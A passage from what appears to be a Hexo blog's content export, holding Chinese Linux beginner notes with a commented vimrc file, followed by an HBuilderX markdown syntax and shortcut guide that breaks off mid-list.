append(line(&quot;.&quot;), &quot;\\# File Name: &quot;.expand(&quot;%&quot;)) \n          call append(line(&quot;.&quot;)+1, &quot;\\# Author: Li Ziqiang&quot;) \n          call append(line(&quot;.&quot;)+2, &quot;\\# mail: 2296557984@qq.com&quot;) \n          call append(line(&quot;.&quot;)+3, &quot;\\# Created Time: &quot;.strftime(&quot;%c&quot;))\n          call append(line(&quot;.&quot;)+4, &quot;\\############################&quot;) \n          call append(line(&quot;.&quot;)+5, &quot;\\#!/bin/bash&quot;) \n          call append(line(&quot;.&quot;)+6, &quot;&quot;) \n      else \n          call setline(1, &quot;/******************************&quot;) \n          call append(line(&quot;.&quot;), &quot;    &gt; File Name: &quot;.expand(&quot;%&quot;)) \n          call append(line(&quot;.&quot;)+1, &quot;    &gt; Author:Li Ziqiang&quot;) \n          call append(line(&quot;.&quot;)+2, &quot;    &gt; Mail: 2296557984@qq.com &quot;) \n          call append(line(&quot;.&quot;)+3, &quot;    &gt; Created Time: &quot;.strftime(&quot;%c&quot;)) \n          call append(line(&quot;.&quot;)+4, &quot; *****************************/&quot;) \n          call append(line(&quot;.&quot;)+5, &quot;&quot;)\n      endif\n\n      &quot;新建文件后，自动定位到文件末尾\n      autocmd BufNewFile * normal G\n  endfunc \n</code></pre>\n","site":{"data":{}},"excerpt":"<p><a href=\"https://book.apeland.cn/details/189/\">本笔记的友情链接</a></p>\n<h2 id=\"常用目录介绍\"><a href=\"#常用目录介绍\" class=\"headerlink\" title=\"常用目录介绍\"></a>常用目录介绍</h2><ol>\n<li>boot    存放启动文件</li>\n<li>dev     存放设备文件</li>\n<li>etc     存放配置文件</li>\n<li>home    普通用户家目录，以/home/$username的方式存放</li>\n<li>media   移动存储自动挂载目录,以 /media/$device_name的方式来存放</li>\n<li>mnt     手动挂载目录</li>\n<li>opt     三方软件安装目录</li>\n<li>proc    内存系统文件</li>\n<li>root    管理员家目录</li>\n<li>run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成</li>\n<li>srv     服务相关数据</li>\n<li>sys     系统文件</li>\n<li>tmp     临时文件夹</li>\n<li>usr     存放库文件、文档、命令、用户数据等</li>\n<li>var     日志存放lib     库文件","more":"</li>\n</ol>\n<ul>\n<li>-echo相当于python中的print，即输出、打印的意思</li>\n</ul>\n<h2 id=\"linux基本命令\"><a href=\"#linux基本命令\" class=\"headerlink\" title=\"linux基本命令\"></a>linux基本命令</h2><h3 id=\"命令-命令选项-参数\"><a href=\"#命令-命令选项-参数\" class=\"headerlink\" title=\"命令[命令选项][参数]\"></a>命令[命令选项][参数]</h3><p>​    {必选项}， [可选项]</p>\n<p>1）清屏命令：clear      快捷键  ctrl+l<br>2）帮助命令：man<br>3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】<br>4）列出当前目录内容命令：ls   [-a -l -d ] 【list】<br>5）显示主机名：hostname<br>6）显示日期时间：date [-s %F]<br>7）显示日历：cal<br>8）计算器：bc<br>9）重启命令：reboot     shutdown -r      init 6<br>10）注销命令：logout<br>11）关机命令：halt      shutdown -h         init 0<br>12) 显示当前操作系统和机器的信息: uname<br>13) 显示当前路径: pwd 【定位自己的位置】</p>\n<p>-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主<br>-命令选项写全称时，前面加 — —</p>\n<ul>\n<li><p>从命令行启动图形界面的默认图片查看器</p>\n<p>​    运行命令：xdg-open filename.png</p>\n</li>\n<li><p>在命令行打开一个图片:</p>\n<ol>\n<li><p>apt install fim</p>\n</li>\n<li><p>fim filename.png</p>\n<ul>\n<li><p>fim是fbi的升级版</p>\n<p><a href=\"http://www.itpro.net.cn/2019/12/linux\">有关于fim的操作链接</a></p>\n</li>\n</ul>\n</li>\n</ol>\n</li>\n<li><p>apt 与apt-get 的区别：apt-get 是 apt 的子集</p>\n</li>\n<li><p>更新安装包：apt upgrade</p>\n</li>\n</ul>\n<h3 id=\"安装内核头文件\"><a href=\"#安装内核头文件\" class=\"headerlink\" title=\"安装内核头文件\"></a>安装内核头文件</h3><ul>\n<li>输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可</li>\n</ul>\n<h3 id=\"安装照相机\"><a href=\"#安装照相机\" class=\"headerlink\" title=\"安装照相机\"></a>安装照相机</h3><pre><code>sudo apt install cheese</code></pre><h3 id=\"u盘修改只读模式\"><a href=\"#u盘修改只读模式\" class=\"headerlink\" title=\"u盘修改只读模式\"></a>u盘修改只读模式</h3><ol>\n<li>查看U盘分区</li>\n</ol>\n<pre><code>sudo fdisk -l</code></pre><ol start=\"2\">\n<li>查看U盘的挂载点</li>\n</ol>\n<pre><code>df U盘分区</code></pre><ol start=\"3\">\n<li>卸载原挂载的U盘</li>\n<li>修复U盘的文件管理系统</li>\n</ol>\n<pre><code>sudo dosfsck -v -a [U盘分区]</code></pre><ol start=\"5\">\n<li>重新挂载</li>\n</ol>\n<h3 id=\"蓝牙\"><a href=\"#蓝牙\" class=\"headerlink\" title=\"蓝牙\"></a>蓝牙</h3><pre><code>sudo service bluetooth start  //打开蓝牙配适器\nsudo service bluetooth stop   //关闭蓝牙配适器</code></pre><h3 id=\"关闭进程\"><a href=\"#关闭进程\" class=\"headerlink\" title=\"关闭进程\"></a>关闭进程</h3><ul>\n<li>有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程</li>\n<li>kill -9 进程IP    //可利用htop命令查看进程IP</li>\n<li>若没有htop，可下载</li>\n</ul>\n<pre><code>sudo apt install htop</code></pre><h3 id=\"卸载-IntelliJ-IDEA-类似卸载可参考\"><a href=\"#卸载-IntelliJ-IDEA-类似卸载可参考\" class=\"headerlink\" title=\"卸载 IntelliJ IDEA(类似卸载可参考)\"></a>卸载 IntelliJ IDEA(类似卸载可参考)</h3><ol>\n<li>寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载</li>\n<li>若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除</li>\n<li>可能会存在开始菜单栏里依然有图标显示的问题，</li>\n</ol>\n<pre><code>cd ~/.local/share/applications</code></pre><ol start=\"4\">\n<li>之后在applications文件夹里找到相对应的配置文件删除即可</li>\n</ol>\n<h3 id=\"linux换源\"><a href=\"#linux换源\" class=\"headerlink\" title=\"linux换源\"></a>linux换源</h3><ul>\n<li>进入目录  /etc/apt/</li>\n<li>sudo vim source.list</li>\n<li>上网寻找适合自己的源</li>\n</ul>\n<h3 id=\"关于Anaconda的安装\"><a href=\"#关于Anaconda的安装\" class=\"headerlink\" title=\"关于Anaconda的安装\"></a>关于Anaconda的安装</h3><ul>\n<li><p>在清华镜像站下载Anaconda</p>\n</li>\n<li><p>安装后修改环境变量</p>\n<ul>\n<li><p>sudo vim /etc/profile</p>\n</li>\n<li><p>向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH</p>\n<pre><code>                       %%blacksheep为用户名，应选择自己的路                            径配置环境变量</code></pre></li>\n</ul>\n</li>\n<li><p>安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响</p>\n</li>\n<li><p>更换anaconda的源，以清华源举例：</p>\n<ul>\n<li><p>sudo vim ~/.condarc</p>\n</li>\n<li><p>向里面写入：</p>\n</li>\n</ul>\n</li>\n</ul>\n<pre><code>```\nchannels:\nhttps://mirrors.ustc.edu.cn/anaconda/pkgs/main/\nhttps://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/\nhttps://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\ndefaults\nshow_channel_urls: true\n```</code></pre><h3 id=\"关于qq的安装问题\"><a href=\"#关于qq的安装问题\" class=\"headerlink\" title=\"关于qq的安装问题\"></a>关于qq的安装问题</h3><ul>\n<li>在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了</li>\n<li>关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决</li>\n</ul>\n<pre><code>apt-get install xfonts-intl-chinese\napt-get install ttf-wqy-microhei</code></pre><ul>\n<li>关于QQ用wine装好后找不到的问题<ul>\n<li>wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出</li>\n<li>输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin</li>\n<li>你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序</li>\n<li>为了方便，可以把QQ/Bin 放到home文件下</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关于输入法的问题\"><a href=\"#关于输入法的问题\" class=\"headerlink\" title=\"关于输入法的问题\"></a>关于输入法的问题</h3><ul>\n<li>搜狗输入法兼容性不咋地，反正安装了很多遍都不行</li>\n<li>谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心</li>\n<li>推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了</li>\n</ul>\n<h3 id=\"wps字体问题\"><a href=\"#wps字体问题\" class=\"headerlink\" title=\"wps字体问题\"></a>wps字体问题</h3><ul>\n<li>使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体</li>\n<li>将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令</li>\n</ul>\n<pre><code>sudo fc-cache -fv     //识别字体库\n\nfc-list :lang=zh-cn | sort    //确认是否安装</code></pre><h3 id=\"关于vmware-虚拟机安装\"><a href=\"#关于vmware-虚拟机安装\" class=\"headerlink\" title=\"关于vmware 虚拟机安装\"></a>关于vmware 虚拟机安装</h3><ol>\n<li>官网下载虚拟机最新版本</li>\n<li>chmod -x 下载的文件</li>\n<li>sudo bash 下载的文件</li>\n<li>之后就可以在电脑中找到虚拟机，并进行下一步的安装操作</li>\n</ol>\n<h3 id=\"linux-vmware升级问题\"><a href=\"#linux-vmware升级问题\" class=\"headerlink\" title=\"linux-vmware升级问题\"></a>linux-vmware升级问题</h3><p><a href=\"https://www.cnblogs.com/wjshan0808/p/4110495.html\">解决 linux升级 导致VMware启动出现”before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel” 而无法卸载</a></p>\n<pre><code># vmware-uninstall \nYou have gotten this message because you are either downgrading VMware\nWorkstation, Player, or VIX, or because you attempted to run either\nvmware-uninstall or vmware-uninstall-vix.\n\nIf you are downgrading, please uninstall all newer versions first, then\ninstall again.\n\nThe vmware-uninstall* scripts have been deprecated.  Instead, please use\nthe vmware-installer.\n\nLong form:\n      vmware-installer --uninstall-product PRODUCT\nShort form:\n      vmware-installer -u PRODUCT\n\nWhere PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.\n\nFor a list of which products are installed, you may run:\n      vmware-installer --list-products\nor:\n      vmware-installer -l\n\n\n# vmware-installer -l\nProduct Name         Product Version     \n==================== ====================\nvmware-workstation   10.0.4.2249910      \n# vmware-installer -u vmware-workstation</code></pre><h3 id=\"man-中文手册下载\"><a href=\"#man-中文手册下载\" class=\"headerlink\" title=\"man 中文手册下载\"></a>man 中文手册下载</h3><ol>\n<li>Debian / Ubuntu安装</li>\n</ol>\n<pre><code>sudo apt update\nsudo apt install manpages-zh</code></pre><ol start=\"2\">\n<li>Arch Linux:</li>\n</ol>\n<pre><code>pacman -Syu\npacman -S man-pages-zh_cn man-pages-zh_tw</code></pre><ol start=\"3\">\n<li>Red Hat / CentOS:</li>\n</ol>\n<pre><code>yum update\nyum install man-pages-zh-CN</code></pre><ol start=\"4\">\n<li>Fedora:</li>\n</ol>\n<pre><code>dnf update\ndnf install man-pages-zh-CN</code></pre><h3 id=\"kali内核更新安装\"><a href=\"#kali内核更新安装\" class=\"headerlink\" title=\"kali内核更新安装\"></a>kali内核更新安装</h3><ol>\n<li>查看内核版本</li>\n</ol>\n<pre><code>uname -r</code></pre><ol start=\"2\">\n<li>检查linux是否安装对应的头文件</li>\n</ol>\n<pre><code>sudo apt-cache search linux-headers</code></pre><ol start=\"3\">\n<li>安装更新头文件</li>\n</ol>\n<pre><code>sudo apt install linux-headers-$(uname -r)</code></pre><ol start=\"4\">\n<li>内核头文件检测是否安装</li>\n</ol>\n<pre><code>sudo dpkg-query -s linux-headers-`uname -r`</code></pre><h3 id=\"vim命令\"><a href=\"#vim命令\" class=\"headerlink\" title=\"vim命令\"></a>vim命令</h3><ol>\n<li>:set number 显示行号</li>\n<li>:set 取消行号</li>\n<li>xG:跳转到指定的第x行，G移动到文件末尾行</li>\n<li>dd ：剪切一行， yy：复制一行</li>\n<li>D：剪切一个字符，y：复制一个字符</li>\n<li>p：粘贴</li>\n<li>dxw：删除光标右边x个字符</li>\n<li>dxh：删除光标左边x个字符</li>\n<li>:x 删除一个字符</li>\n<li>/string :查找字符 n:向上查找，N：向下查找</li>\n<li>:范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换</li>\n</ol>\n<ul>\n<li>vim规则总结</li>\n</ul>\n<p>（1）一般是操作字符+被操作的量</p>\n<p>（2）$ 为结尾， 0 为开头</p>\n<ul>\n<li>vim简单配置：</li>\n</ul>\n<pre><code class=\"c\">  &quot;===================\n  &quot;适合自己用的vimrc配置文件\n  &quot;===================\n\n  &quot;设置编码\n  set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936\n  set termencoding=utf-8\n  set encoding=utf-8\n\n  &quot;保存.vimrc文件时自动重启加载，即让此文件立即生效\n  autocmd BufWritePost $MYVIMRC source $MYVIMRC\n\n  &quot;语法高亮\n  syntax on\n\n  &quot;设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容\n  &quot;set ruler\n\n  &quot;设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]\n  &quot;%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.\n  &quot;%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.\n  set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %&#123;strftime(\\&quot;%H:%M\\&quot;)&#125;\n\n  &quot;显示行号\n  set nu &quot;等同于 set number\n\n  &quot;突出显示当前行\n  set cursorline &quot;等同于 set cul\n\n  &quot;突出显示当前列\n  set cursorcolumn &quot;等同于 set cuc\n\n  &quot;共享剪贴板  \n  set clipboard+=unnamed \n\n  &quot;从不备份  \n  set nobackup\n\n  &quot;自动保存\n  set autowrite\n\n  &quot;隐藏工具栏\n  &quot;set guioptions-=T\n  &quot;隐藏菜单栏\n  &quot;set guioptions-=m\n\n  &quot;高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.\n  &quot;set hlsearch\n\n  &quot;光标立刻跳转到搜索到内容\n  &quot;set incsearch\n\n  &quot;搜索到最后匹配的位置后,再次搜索不回到第一个匹配处\n  &quot;set nowrapscan\n\n  &quot;去掉输入错误时的提示声音\n  set noeb\n\n  &quot; 默认按下Esc后,需要等待1秒才生效,设置Esc超时时间为100ms,尽快生效\n  set ttimeout\n  set ttimeoutlen=100\n\n  &quot;在处理未保存或只读文件的时候，弹出确认\n  set confirm\n\n  &quot;让Backspace键可以往前删除字符.\n  &quot;Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,\n  &quot;可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,\n  &quot;可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.\n  &quot;使回格键（backspace）正常处理indent, eol, start等\n  set backspace=indent,eol,start\n\n  &quot;允许backspace和光标键跨越行边界\n  &quot;set whichwrap+=&lt;,&gt;,h,l\n\n  &quot;去掉有关vi一致性模式,避免操作习惯上的局限.\n  set nocompatible\n\n  &quot;FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置\n  &quot;全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.\n  &quot;但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现\n  &quot;可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.\n  &quot; mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a\n  set mouse=n\n  &quot;set selection=exclusive\n  &quot;set selectmode=mouse,key\n\n  &quot;高亮显示括号匹配\n  set showmatch\n\n  &quot;设置Tab长度为4空格\n  set tabstop=4\n  &quot;设置自动缩进长度为4空格\n  set shiftwidth=4\n  &quot;自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置\n  &quot;set autoindent\n  &quot;不要用空格代替制表符\n  set noexpandtab\n  &quot;输入tab制表符时，自动替换成空格\n  &quot;set expandtab\n  &quot;设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.\n  &quot;softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.\n  &quot;set softtabstop=4\n\n\n  &quot;显示空格和tab键\n  set listchars=tab:&gt;-,trail:-\n\n  &quot;1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名\n  set laststatus=2\n\n  &quot;自动补全\n  :inoremap ( ()&lt;ESC&gt;i\n  :inoremap ) &lt;c-r&gt;=ClosePair(&#39;)&#39;)&lt;CR&gt;\n  :inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O\n  :inoremap &#125; &lt;c-r&gt;=ClosePair(&#39;&#125;&#39;)&lt;CR&gt;\n  :inoremap [ []&lt;ESC&gt;i\n  :inoremap ] &lt;c-r&gt;=ClosePair(&#39;]&#39;)&lt;CR&gt;\n  :inoremap &quot; &quot;&quot;&lt;ESC&gt;i\n  :inoremap &#39; &#39;&#39;&lt;ESC&gt;i\n  function! ClosePair(char)\n      if getline(&#39;.&#39;)[col(&#39;.&#39;) - 1] == a:char\n          return &quot;\\&lt;Right&gt;&quot;\n      else\n          return a:char\n      endif\n  endfunction \n  &quot;打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文\n  filetype plugin indent on\n  &quot; 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过\n  &quot; CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.\n  &quot; 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较\n  &quot; 麻烦,不做设置,保持默认设置,vim默认没有设置longest.\n  &quot;set completeopt=longest,menu &quot;启用这句才会开启自动补全\n\n\n  &quot;=============显示中文帮助\n  if version &gt;= 603\n      set helplang=cn\n      set encoding=utf-8\n  endif\n\n  &quot;=============新建.c,.h,.sh,.java文件，自动插入文件头 \n  autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec &quot;:call SetTitle()&quot; \n  &quot;&quot;定义函数SetTitle，自动插入文件头 \n  func SetTitle() \n      &quot;如果文件类型为.sh文件 \n      if &amp;filetype == &#39;sh&#39; \n          call setline(1,&quot;\\############################&quot;) \n          call append(line(&quot;.&quot;), &quot;\\# File Name: &quot;.expand(&quot;%&quot;)) \n          call append(line(&quot;.&quot;)+1, &quot;\\# Author: Li Ziqiang&quot;) \n          call append(line(&quot;.&quot;)+2, &quot;\\# mail: 2296557984@qq.com&quot;) \n          call append(line(&quot;.&quot;)+3, &quot;\\# Created Time: &quot;.strftime(&quot;%c&quot;))\n          call append(line(&quot;.&quot;)+4, &quot;\\############################&quot;) \n          call append(line(&quot;.&quot;)+5, &quot;\\#!/bin/bash&quot;) \n          call append(line(&quot;.&quot;)+6, &quot;&quot;) \n      else \n          call setline(1, &quot;/******************************&quot;) \n          call append(line(&quot;.&quot;), &quot;    &gt; File Name: &quot;.expand(&quot;%&quot;)) \n          call append(line(&quot;.&quot;)+1, &quot;    &gt; Author:Li Ziqiang&quot;) \n          call append(line(&quot;.&quot;)+2, &quot;    &gt; Mail: 2296557984@qq.com &quot;) \n          call append(line(&quot;.&quot;)+3, &quot;    &gt; Created Time: &quot;.strftime(&quot;%c&quot;)) \n          call append(line(&quot;.&quot;)+4, &quot; *****************************/&quot;) \n          call append(line(&quot;.&quot;)+5, &quot;&quot;)\n      endif\n\n      &quot;新建文件后，自动定位到文件末尾\n      autocmd BufNewFile * normal G\n  endfunc \n</code></pre>"},{"title":"Markdown_doc_for_HBulider","date":"2020-10-21T01:08:28.000Z","comments":1,"_content":"\n\n\n# markdown - 更简洁、更高效\n\n=================================================\n\n强烈建议开发者认真阅读本文档，掌握md及HBuilderX对md的强大支持。\n_窄屏幕下，可按Alt+滚轮横向滚动_\n\n<!--more-->\n\n很多人只把markdown用于网络文章发表，这糟蹋了markdown。\nmarkdown不止是HTML的简化版，更重要的是txt的升级版、word的轻量版、笔记的最佳载体。\n作为一种简单的格式标记语言，不同于txt的无格式，不同于HTML的复杂标记，也不同于word的鼠标调整样式。markdown通过简单的几个字符键入，就可以快捷的定义文档的样式。\n比如在行首敲一个“#”，就把这行定义为了1级标题，并且在HBuilderX里有直观完善的着色，这样无需发布为web页面，可直接当word用。\n掌握markdown，你可以完全抛弃txt和笔记软件的编辑器，并且在大多数场景下替代掉复杂臃肿的word。享受简洁之美、享受效率提升。\n而HBuilderX，可以被称为最强大的markdown书写工具了。\n\n下面的示例列举了markdown语法及对应的HBuilderX使用技巧：\n\n开始前，可以先按下文档结构图的快捷键Alt+w（Mac是Ctrl+w），浏览本文的大纲。\n\n# 标题语法\nmarkdown的标题是行首以#号开头，空格分割的，不同级别的标题，在HX里着色也不同。如下：\n# 标题1\n## 标题2\n### 标题3\n#### 标题4\n##### 标题5\n###### 标题6\n\n标题使用技巧：\n1. Emmet快速输入：敲h2+Tab即可生成二级标题【同HTML里的emmet写法，不止标题，HX里所有可对应tag的markdown语法均支持emmet写法】。仅行首生效\n2. 智能双击：双击#号可选中整个标题段落\n3. 智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动在下一行补#。而连续2次回车后将自动补的#去掉。(体验同word)\n4. 回车后再次按Tab可递进一层标题，再按Tab切换列表符\n5. 在# 后回车，可上插一个空标题行【同word】，或任意位置按Ctrl+Shift+Enter也可以上插空标题行\n6. 折叠：\n\t- 点标题前的-号可折叠该标题段落，快捷键是Alt+-（展开折叠是Alt+=）\n\t- 多层折叠时折叠或展开子节点，快捷键是Alt+Shift+-或=\n\t- 全文全部折叠或展开，快捷键是Ctrl+Alt+Shift+-或=\n\t- 折叠其他区域，快捷键是Alt+Shift+o。这对长文档管理非常有用，可以专注于当前章节\n\t- 可以在菜单-跳转-折叠中随时找到这些功能\n\n# 列表\nmarkdown的列表支持有序列表、无序列表以及特殊的任务列表。\n同样也是在行前加一个特殊符号，并空格后再跟列表文字内容。\n\n## 有序列表\n有序列表就是有顺序的列表，依靠行前的数字标记顺序。\n1. 有序列表1 【设置或取消有序列表符的快捷键：Ctrl+Alt+1，可选中多行批量设置序号；支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标】\n2. 有序列表2 【列表后回车会自动补序号】\n4. 有序列表3 【智能双击：双击前面的数字，可重新对数字排序，修正序号错误，并选中有序列表段落（左边的4是故意写错让你体验的）】\n\n## 无序列表\n无序列表就是列表不排序，无序列表因书写随意而被更广泛的使用。\n无序列表有3种前缀，HX里分别用于表示1级列表、2级列表、3级列表。\n- 无序列表1 【快捷键：Ctrl+Alt+-；智能双击：双击-号可选中整段无序列表；再次按Tab会更换二级列表符】\n* 无序列表2\t\n\t* Emmet：li后敲Tab可生成*号列表符，行首生效\n\t* 快捷键：Ctrl+Alt+8【8即*对应的数字】，支持多光标批量设置列表符，即按Ctrl+鼠标左键添加多光标\n\t* 智能双击：双击*号可选中整段无序列表\n\t* 智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；再次按Tab会更换列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符\n\t* *号常用于二级列表，列表符后继续Tab，可切换列表符\n+ 无序列表3 【快捷键：Ctrl+Alt+=；常用于三级列表；其他同上】\n\n## 任务列表\n任务列表非常实用，管理待办、已办非常便利。\n[ ] 任务列表-未完成任务 【快捷键：Ctrl+Alt+[】\n[x] 任务列表-已完成任务 【快捷键：Ctrl+Alt+]】\n\t1. 智能双击：双击方括号内可切换勾选状态，把任务标记为完成或未完成；双击方括号右侧可选中任务列表段落\n\t2. 智能回车：回车后自动补任务列表前缀符号；连续按回车清除前缀符号；在列表符后回车或行尾Shift+回车，上一行留出列表符\n- [ ] 如需发布到web渲染，需增加无序列表- 的前缀\n\n以上三种列表，均支持批量修改列表符，有如下方式建议依次学习尝试：\n1. 选中多行，按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，批量设置列表符\n2. 如果需要跳行设置有序或无序列表，通过Ctrl+鼠标左键点中目标多行（可不连续），产生多光标，然后按快捷键Ctrl+Alt+“1”或“-”或“[”或“]”，可跳行设置列表符，尤其是有序列表，数字也会跳行加1\n3. 按Alt+鼠标选中行首那列（列选择），这样每行行首都有光标，然后再键入或删除列表符即可批量操作\n4. 选中多行，按快捷键Ctrl+Shift+\\（其实就是Ctrl+|），可以在每行行首添加一个光标\n\n## 引用列表\n> 引用1\n> 引用2\n快捷键：Ctrl+Alt+Shift+.\n智能双击：双击>号可选中整段引用列表\n智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动续列表；连续按回车会清除列表符；在列表符后回车或行尾Shift+回车，上一行留出列表符\n\n# 文字样式语法\n**加粗** 【快捷键：Ctrl+B，支持多光标；Emmet：b后敲Tab】\n__加粗2__\n_倾斜_【Emmet：i后敲Tab；前后包围：选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入_】\n*倾斜*\n~~删除线~~\n``` 单行代码 ```\n包围插入：先选中文字内容，然后按_*~`等符号，会自动在2侧加包围\n智能双击：双击语法区前面的定义符号，选中包含定义符的整段文字\n去包围：选中整段文字后，按Ctrl+Shift+]，可去除2侧包围符号\n\n引号括号虽然不属于markdown语法，但也支持相同的包围、选择、去包围操作。\n引号括号智能双击选择时略特殊的是：双击引号括号内侧，选中引号括号里的内容(不含引号括号)；按下Alt+双击引号括号内侧，则选中包含符号的整段文字\n\nHBuilderX还支持以下对2侧文本高效处理的手段\n1. 选中文字按Ctrl+\\是在选区两侧添加光标，可以继续输入~~，会在2侧同时输入\n2. 向2侧扩大选择：【Win:Alt+Shit+→ 、Mac:Ctrl++Shit+→】；由2侧向内减少选择：【Win:Alt+Shit+← 、Mac:Ctrl++Shit+←】\n\n[链接文字](http://dcloud.io)\n1. Emmet：a后敲Tab\n2. 打开链接：Alt+鼠标单击；如果是本地文件，可通过Shift+Alt+单击，在另一分栏打开文件\n3. 智能粘贴：粘贴URL会自动变成超链接格式；粘贴本地文件进来也会自动创建引用链接\n4. 智能双击：双击语法区开头，即[左侧，选中包含定义符的整段文字\n\n![图片描述文字](logo.jpg)\n1. Emmet：img后敲Tab\n2. 智能粘贴：粘贴剪切板里的图形时会自动保存为本md文档的附件；删除文档中的图片语法，保存md文档时会自动删除对应的图片附件；粘贴图片文件时自动变成链接引用格式；\n3. 悬浮预览：鼠标移到图片语法上，本地图片会自动显示出来\n4. 智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字\n\n# 表格 \n\n|\t\t|\t\t|\t\t|\n|--\t|--\t|--\t|\n|\t\t|\t\t|\t\t|\n|\t\t|\t\t|\t\t|\n\n1. Emmet：table3*3后敲Tab，表示生成3行3列的表格，行首生效\n2. md表格对齐是传统md的痛点，按下Ctrl+K可以自动整理表格格式（暂未兼容不同缩放模式和字体的情况）\n3. 支持从excel、wps、word、number的表格中复制粘贴表格进来（不支持合并单元格和单元格换行）\n\n# 分割线\n------------- 【Emmet：hr后敲Tab】\n*************\n=============\n\n# 代码区\n``` javascript\n\tvar a = document\n```\nEmmet：code后敲Tab，行首生效\n智能双击：双击语法区开头，即!左侧，选中包含定义符的整段文字\n支持代码直接高亮着色，这应该是只有HBuilderX才有的功能。注意需要在代码区开头指定语言类型\n\n# 注释\n<!--注释--> \n快捷键：Ctrl+/\n智能双击：双击注释首尾的定义符，选中整段注释\n\n# 其他emmet快捷输入\nday后敲Tab，当前日期。注意day需在行首或前面有空格\ntime后敲Tab，当前时间。注意time需在行首或前面有空格\n\n# 文档结构图\n文章很长时，word里有文档结构图，HBuilderX也有。\n菜单视图-文档结构图，快捷键Alt+W(mac是ctrl+W)，轻松管理长文档\n\n# 运行、预览和打印PDF\n对md文件点工具栏或菜单里的浏览器运行，可以使用外部浏览器预览此md文件，会自动渲染为HTML。\n点右上角的预览【快捷键Alt+p】，可在HBuilderX右侧预览该md文档的HTML渲染结果。\n在浏览器中点打印，选择打印到PDF，可将md输出为PDF格式。（注意在打印选项里去掉页眉页脚）\n\n# 其他常用但你可能不知道的快捷操作技巧\n- Ctrl+鼠标左键添加多光标，然后敲字或粘贴，可批量处理。Ctrl+鼠标左键拖选，可选中多个选区。\n- Ctrl+鼠标右键删除多光标\n- 不选内容按Ctrl+C或X可复制或剪切整行\n- 选中2个选区后，按Ctrl+Shift+X，可互换选区内容。如无选区，只是2个光标，则互换2行\n- Ctrl+上下键可上下移动行\n- Ctrl+Insert可重复插入当前行，如果有选中内容，可重复插入选中内容\n- Ctrl+Shift+K可合并多行（是格式化Ctrl+K的反操作）\n- 删除\n\t* 按Ctrl+D可删除选中行，支持多光标\n\t* Shift+Del删除到行尾\n\t* Shift+Backspace删除到行首\n- 选择\n\t* Ctrl+E选相同词(mac是Command+D)，连续按可选中多词进一步操作，比替换更方便\n\t* Ctrl+L可连选多行，Ctrl+Shift+L也是选择行，但不选行首尾的空白字符\n\t* 